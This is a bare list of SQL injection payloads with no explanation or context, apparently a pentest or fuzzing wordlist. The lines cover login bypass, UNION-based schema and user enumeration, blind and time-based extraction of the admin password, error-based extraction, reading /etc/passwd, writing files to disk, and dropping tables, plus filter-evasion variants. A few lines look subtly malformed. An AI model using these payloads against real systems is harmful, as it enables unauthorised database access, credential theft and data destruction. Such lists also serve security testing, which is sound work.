1 OR 1=1
'
" #
') OR 1=1
UNION SELECT 1,@@version,3
UNION SELECT 1,version(),3 FROM dual
UNION SELECT 1,sqlite_version(),3
AND EXISTS (SELECT * FROM sysobjects)
AND EXISTS (SELECT * FROM information_schema.tables)
UNION SELECT database(),2,3
UNION SELECT group_concat(schema_name),2 FROM information_schema.schemata
UNION SELECT group_concat(table_name),2 FROM information_schema.tables
UNION SELECT group_concat(column_name),2 FROM information_schema.columns
UNION SELECT 1,user(),3
UNION SELECT 1,sys_context('USERENV','SESSION_USER'),3 FROM dual
OR EXISTS (SELECT * FROM users)
AND (SELECT COUNT() FROM users) > 0
OR (SELECT LENGTH(password) FROM users WHERE username='admin') > 8
AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1) = 'a'
AND SLEEP(5)
WAITFOR DELAY '0:0:5'
AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0)
1; DO SLEEP(5)
BEGIN DBMS_LOCK.SLEEP(5); END;
AND (SELECT 1 FROM (SELECT COUNT(),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
AND extractvalue(1, concat(0x7e, (SELECT database())))
AND updatexml(1, concat(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1)), 1)
AND 1=(SELECT 1 FROM dual WHERE (SELECT username FROM users WHERE rownum=1)='admin')
UNION SELECT load_file('/etc/passwd'),2
1; SELECT 'test' INTO OUTFILE '/tmp/test.txt'
%df' OR 1=1--
SELECT * FROM users WHERE id=1; DROP TABLE users--
1'; CREATE TABLE malicious (cmd TEXT)--
SELECT * FROM users WHERE id=1/! UNION SELECT 1,user(),3 /--
1/!50000 UNION SELECT 1,database(),3 */--
' AND MD5(1) = MD5(2)--
' AND LEN((SELECT username FROM admin)) > 5--
username=' OR 1=1--
SELECT * FROM users WHERE username='{$stored_username}'--
' AND pg_sleep(5)--
' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test'--